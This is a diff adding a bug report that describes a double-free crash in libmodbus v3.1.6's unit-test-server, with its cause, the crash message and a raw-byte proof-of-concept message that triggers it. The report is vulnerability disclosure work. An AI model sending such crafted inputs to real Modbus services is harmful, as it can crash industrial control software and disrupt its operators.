@@ -1,0 +1,15 @@
+issue #803
+
+Description
+A double- free bug was found in libmodbus v3.1.6, which could be triggered by sending a specific message to unit-test-server. The cause seems to be due to the ctx pointer in unit-test-server.c being free and then freed in modbus_free(ctx).
+
+Actual behavior if applicable
+double free or corruption (out)
+
+Expected behavior or suggestion
+no crash
+
+PoC
+
+<00><01><1f><03><7f><40><00><17><01><6c><00><03><00><42><00><20><40><06><ee><0f><10><00><00><08><01><fa><00><00><d7><01><01><01><01><01><01><40><00><11><00><fc><00><00><40><06><ee><01><01><40><00><09><e9><fc><00><00><40><00><12><00><fc><ff><7f><00><00><ee><0f><0e><00><00><08><01><fa><00><00><d7><01><01><01><01><01><01><40><00><12><00><fc><00><00><40><06><ee><01><01><fc><ff><7f>
+
